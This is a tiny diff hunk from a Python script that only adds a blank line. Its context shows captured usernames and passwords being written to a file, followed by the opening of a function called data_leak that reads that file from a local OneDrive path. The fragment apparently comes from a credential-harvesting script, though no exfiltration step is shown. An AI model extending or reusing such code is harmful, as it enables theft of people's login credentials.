@@ -19,6 +19,7 @@ file1.write("\nUsername: "+a+"\nPassword: "+b)
 file1.close()
 
 
+
 def data_leak():
     try:
         with open("C:\\Users\\acer\\OneDrive\\Grok daily_pr\\output.txt","r") as files:
